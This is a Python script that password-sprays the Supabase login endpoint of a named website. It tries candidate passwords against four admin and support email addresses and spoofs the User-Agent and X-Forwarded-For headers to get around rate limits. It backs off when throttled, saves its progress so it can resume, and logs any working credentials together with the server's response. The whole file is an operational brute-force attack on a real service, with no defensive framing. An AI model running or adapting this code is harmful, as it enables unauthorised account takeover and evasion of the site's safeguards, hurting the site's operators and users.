import ssl, json, urllib.request, urllib.error, time, threading, random, os

BASE = "https://onlyfakeai.ru/api/supabase"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

exec(open("tor_spray.py", encoding="utf-8").read().split("cands = build_candidates()")[0])
cands = build_candidates()
prio_emails = ["onlyfake@tuta.io", "admin@onlyfakeai.ru",
               "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru"]
rows = [f"{em}:{pw}" for pw in cands for em in prio_emails]

state_file = "fast_state.json"
if os.path.exists(state_file):
    state = json.load(open(state_file))
else:
    state = {"i": 0, "hits": [], "throttles": 0, "other": 0}

lock = threading.Lock()
stop = threading.Event()
log = open("fast_spray.log", "a", encoding="utf-8")

def do_req(email, pw, xff):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36",
         "apikey": KEY, "Content-Type": "application/json",
         "X-Forwarded-For": xff}
    body = json.dumps({"email": email, "password": pw}).encode()
    r = urllib.request.Request(f"{BASE}/auth/v1/token?grant_type=password",
                               data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

def worker(wid):
    while not stop.is_set():
        with lock:
            if state["i"] >= len(rows):
                break
            i = state["i"]
            state["i"] = i + 1
        email, _, pw = rows[i].partition(":")
        xff = f"{random.choice(['198.51.100','203.0.113','192.0.2'])}.{random.randint(1,250)}"
        for attempt in range(4):
            st, body = do_req(email, pw, xff)
            if st == 200:
                with lock:
                    state["hits"].append({"email": email, "password": pw, "resp": body[:400]})
                    stop.set()
                log.write(f"{time.strftime('%H:%M:%S')} HIT {email}:{pw}\n")
                log.flush()
                print(f"\n!!! HIT {email} : {pw}\n{body[:500]}", flush=True)
                json.dump(state, open(state_file, "w"))
                return
            if st == 429:
                with lock:
                    state["throttles"] += 1
                    thr = state["throttles"]
                if thr % 20 == 0:
                    log.write(f"{time.strftime('%H:%M:%S')} 429 thr={thr}\n"); log.flush()
                time.sleep(3 + random.random() * 4)
                continue
            if st == 403:
                with lock:
                    state["other"] += 1
                    oth = state["other"]
                log.write(f"{time.strftime('%H:%M:%S')} 403 oth={oth} {body[:80]}\n"); log.flush()
                time.sleep(8)
                continue
            if st == 0:
                log.write(f"{time.strftime('%H:%M:%S')} ERR {str(body)[:80]}\n"); log.flush()
                time.sleep(1)
                continue
            break
        time.sleep(0.3)
        with lock:
            done = state["i"]
        if done % 100 == 0:
            json.dump(state, open(state_file, "w"))
            log.write(f"{time.strftime('%H:%M:%S')} {done}/{len(rows)} thr={state['throttles']} other={state['other']}\n")
            log.flush()

THREADS = 1
print(f"[fast] {len(rows)} rows, resume at {state['i']}, {THREADS} threads", flush=True)
ts = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(THREADS)]
for t in ts:
    t.start()
for t in ts:
    t.join()
json.dump(state, open(state_file, "w"))
print("[done]", state["i"], "hits:", state["hits"], flush=True)
